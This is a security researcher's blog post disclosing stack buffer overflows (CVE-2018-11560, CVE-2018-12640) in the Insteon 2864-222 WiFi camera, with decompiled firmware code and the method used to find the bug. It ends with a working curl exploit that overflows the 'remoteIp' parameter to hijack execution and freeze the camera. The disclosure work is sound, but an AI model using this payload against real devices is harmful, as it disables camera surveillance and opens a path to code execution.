# Finding 0-days in Insteon HD WiFI Camera 2864-222

In this brief blogpost we will exploit the Insteon HD Wifi <a href="https://www.amazon.com/Insteon-2864-222-HD-Camera-White/dp/B00Q5XRS8S/ref=sr_1_4?s=hi&ie=UTF8&qid=1522359060&sr=1-4&keywords=insteon+wifi+camera">Camera</a>, model 2864-222.

Without too much talking, let's start.

## Traffic Analysis

According on the Insteon WiFI camera manual, this camera provides an HTTP web interface, which can be accessed at http://<ip_camera>:34100.
Though we tried with all the Internet browsers we could think of (Google Chrome, IE, Firefox, Opera and Safari, lynx), we weren't able to log into the camera to see the video stream.
After calling the Insteon support, we were told that the necessary browser plugins to login using a web browser were not maintained anymore. Too bad!

We then opened wireshark to sniff the traffic between the Insteon app and the camera, and we found, as we can see from the picture below, that the HTTP interface was still active and responding.


![alt text](https://github.com/badnack/Insteon_2864-222/blob/master/shark.png "Wireshark sniffing")


Note also that, the credentials are transmitted in clear text. 
First bad sign. 


## Firmware Analysis
We then wanted to get our hands on the firmware mounted on the camera.
After some research, we found that: 1) the camera firmware is publicly avilable, though encrypted and 2) the Insteon camera is a rebrand of Foscam.
With these information in mind, we downloaded the firmware and successfully decrypted it with one of the known Foscam used passwords.
After looking at the contained binary files, it became clear that the camera mounts an ARM architecture.
Among these, we identified the binary named webService, as the binary handling the user-provide requests.

Once opened with the IDA decompiler, we proceeded in finding the function parsing the URIs parameters. 

To do this we looked for the known GET keywords we observed during the traffic sniffing phase.
In particular, we looked for the keyword 'usr' as in 'usr=root', and after finding it, we retrieved all the functions refercing such string.
After looking at each one of these function, we found the one we were looking for, whose code is reported below.
```c
signed int __fastcall get_value_key(const char *user_URI, const char *key_word, _BYTE *dst_buff)
{
   bool v3; // zf
  signed int counter; // r7
  char *key_val_ptr; // r0
  signed int result; // r0
  const char *assign_ptr; // r5
  signed int assign_len; // r0
  int current_char; // r3
  const char *val_ptr; // r5
  signed int val_len; // r0
  signed int i; // r3
  int c; // r2
  int tmp_buff; // [sp+0h] [bp-98h]

  v3 = key_word == 0;
  if ( key_word )
    v3 = dst_buff == 0;
  if ( v3 )
    return -1;
  counter = 0;
  memset(&tmp_buff, 0, 0x80u);
  strcpy((char *)&tmp_buff, key_word);
  strcat((char *)&tmp_buff, "=");
  key_val_ptr = strstr(user_URI, (const char *)&tmp_buff);
  if ( !key_val_ptr )
  {
    *dst_buff = 0;
    return -1;
  }
  assign_ptr = &key_val_ptr[strlen((const char *)&tmp_buff) - 1];
  assign_len = strlen(assign_ptr);
  do
  {
    if ( counter >= assign_len )
      break;
    current_char = (unsigned __int8)assign_ptr[counter++];
  }
  while ( current_char != '=' );
  val_ptr = &assign_ptr[counter];
  val_len = strlen(val_ptr);
  for ( i = 0; i < val_len; ++i )
  {
    c = (unsigned __int8)val_ptr[i];
    if ( c == '&' )
    {
      dst_buff[i] = 0;
      break;
    }
    dst_buff[i] = c;
  }
  result = 0;
  dst_buff[i] = 0;
  return result;
}
```

As we can see, the above code parses a given URI, searches for the GET key (e.g., 'usr'), skips the '=' characters and finally copy the value associate with the considered key in a provided destination buffer.
The problem here, is that the length of the destination buffer is not provided, let alone check. Therefore, one could potentially provide a value for a the 'usr' key long enough to overwrite any provided destination buffer.
Let's try this out.

First off, we will retrieve the list of the keywords the firmware accepts, by looking for all the cross-references to the above function, and retrieving the passed keywords.
Overall there are __789 different instances__ of this function being called, possibly meaning __789 different unique vulnerabilties__.
We only tested and successfully verified only a bunch of them. For space reasons, and because the exploits look all very similar, here I will report only one of them, for which the __CVE-2018-11560__ was assigned.
Other bugs related to the GET keywords 'pid', 'pwd' and 'usr' were assigned to __CVE-2018-12640__.

Among the GET keys accepted by the web-server, there is one called 'remoteIp'.
The snippet of the function that retrieves its value, by calling the get_value_key function, is reported below:

```c
signed int __fastcall executeCGICmd(int a1, const char *a2)
{
  const char *v2; // r4
  int v3; // r8
  int v5; // r0
  char v6; // [sp+14h] [bp-124h]
  char v7; // [sp+54h] [bp-E4h]
  char v8; // [sp+94h] [bp-A4h]
  char s; // [sp+D4h] [bp-64h]
  int v10; // [sp+114h] [bp-24h]

  v2 = a2;
  v3 = a1;
  if ( !a2 )
    return -1;
  memset(&s, 0, 0x40u);
  memset(&v8, 0, 0x40u);
  memset(&v7, 0, 0x40u);
  v10 = 0;
  sub_2830C(v2, &v7);
  sub_282E8(v2, &s);
  sub_282C4(v2, &v8);
  get_value_key_bug(v2, "remoteIp", &v6);
  if ( !sub_52C44((int)&unk_A5A78, &v6) )
  {
  // additional code...
 ```


As one can see, the destination buffer is defined as big as 64 bytes, which means that if the value provided for the key 'remoteIp' is longer than 64 characters, the function 'get_value_key' will overflow the buffer v6.
Moreover, as the last assembly instruction overwrites the value of PC through a pop from the stack (as shown below), one can calculate the offset of the memory value being popped (i.e., the LR register content), and overwrite it with a known value.

```asm
loc_2907C
ADD     SP, SP, #0x118
LDMFD   SP!, {R4-R10,PC}
; End of function executeCGICmd
```

To easily prove our exaploit and see its effects, we targeted the 'sleep' function.

The final attack is the following:

```bash
time curl --silent --output /dev/null curl 10.250.250.126:34100/cgi-bin/CGIProxy.fcgi\?cmd=asd\&usr=asd\&pwd=asd\&remoteIp=`python -c "print ('A'*266 + '\x9c\x32')"`
```

The above command, when executed, stalls the camera for no less than 45 second.
During this time the camera stream become unavailable, which for a WiFi camera I would say it's pretty bad, if you ask me.

